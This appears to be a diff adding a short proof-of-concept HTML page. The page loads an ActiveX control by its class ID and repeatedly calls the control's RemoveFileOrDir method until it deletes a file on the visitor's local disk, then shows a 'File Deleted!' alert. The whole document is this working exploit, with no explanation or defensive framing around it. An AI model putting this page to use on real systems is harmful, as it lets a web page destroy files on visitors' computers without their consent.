@@ -1,0 +1,23 @@
+<html>
+<OBJECT ID="fileup" CLASSID="CLSID:04FD48E6-0712-4937-B09E-F3D285B11D82"></OBJECT>
+
+<script language="javascript">
+                                                                              
+
+var x = "C:/tmp.txt"; 
+
+var del = true;
+var c   = 1;
+
+while(del) {
+
+	try {
+		fileup.RemoveFileOrDir(x, c);
+		del = false;
+		alert("File Deleted!");
+	} catch(e){ c++; }
+}
+
+</script>
+
+</HTML>
